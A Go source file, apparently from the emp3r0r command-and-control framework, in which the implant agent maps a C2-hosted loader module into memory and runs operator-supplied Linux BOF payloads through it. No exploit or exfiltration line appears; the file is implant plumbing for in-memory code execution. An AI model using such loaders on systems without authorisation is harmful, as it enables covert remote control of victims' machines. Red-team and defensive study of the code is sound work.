//go:build linux

package coffloader

import (
	"fmt"
	"runtime"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/memdeps"
	"github.com/jm33-m0/emp3r0r/core/lib/memmod"
)

// linuxDependency is the module that provides the Linux BOF loader. The C2
// hosts it as coffloader_linux.<arch>.gz; the agent maps it on demand, exactly
// like the Windows COFFLoader DLL.
const linuxDependency = "coffloader_linux"

// maxLoaderOutput bounds the C string read from the loader so a corrupted
// return value cannot make the agent scan unmapped memory forever.
const maxLoaderOutput = 16 << 20

// RunLinuxCOFF executes an x86_64 ELF BOF payload on Linux through the
// coffloader_linux dependency. The dependency is resolved, mapped, used once,
// and unmapped by memdeps.Use. The loader itself links libc, so a statically
// linked agent (no libc mapped) is rejected with an explanatory error.
func RunLinuxCOFF(payload []byte, export string, args []CoffArg, _ uintptr) (string, error) {
	if len(payload) == 0 {
		return "", fmt.Errorf("empty payload")
	}
	if !memmod.LinuxLibcMapped() {
		return "", fmt.Errorf("Linux BOF modules require libc symbol resolution, but this agent is statically linked (no libc is mapped). Use a dynamically linked Linux agent to run Linux BOFs")
	}

	packedArgs, err := PackCoffArgs(args)
	if err != nil {
		return "", err
	}

	wire, err := PackLinuxArgs(packedArgs)
	if err != nil {
		return "", err
	}

	if export == "" {
		export = "go"
	}
	entry := append([]byte(export), 0)

	// The loader installs process signal handlers and executes the BOF on the
	// calling OS thread, so pin the goroutine to it.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var out string
	err = memdeps.Use(linuxDependency, func(module *memmod.Module) error {
		var argsPtr uintptr
		if len(wire) > 0 {
			argsPtr = uintptr(unsafe.Pointer(&wire[0]))
		}

		result, callErr := module.CallExportWithArgs("bof_run",
			uintptr(unsafe.Pointer(&payload[0])),
			uintptr(len(payload)),
			uintptr(unsafe.Pointer(&entry[0])),
			argsPtr,
			uintptr(len(wire)),
		)
		if callErr != nil {
			return callErr
		}
		runtime.KeepAlive(payload)
		runtime.KeepAlive(wire)
		runtime.KeepAlive(entry)

		if result == 0 {
			if msg := loaderError(module); msg != "" {
				return fmt.Errorf("%s", msg)
			}
			return fmt.Errorf("linux BOF loader failed")
		}

		out = readCString(result)
		// The loader allocated the buffer; let it free it while its code is
		// still mapped.
		_, _ = module.CallExportWithArgs("bof_free", result)
		return nil
	})
	return out, err
}

// loaderError fetches the loader's last error message, if any.
func loaderError(module *memmod.Module) string {
	ptr, err := module.CallExportWithArgs("bof_last_error")
	if err != nil || ptr == 0 {
		return ""
	}
	return readCString(ptr)
}

// readCString reads a NUL-terminated string from mapped memory.
func readCString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	buf := make([]byte, 0, 64)
	for i := uintptr(0); i < maxLoaderOutput; i++ {
		b := *(*byte)(unsafe.Pointer(ptr + i))
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}
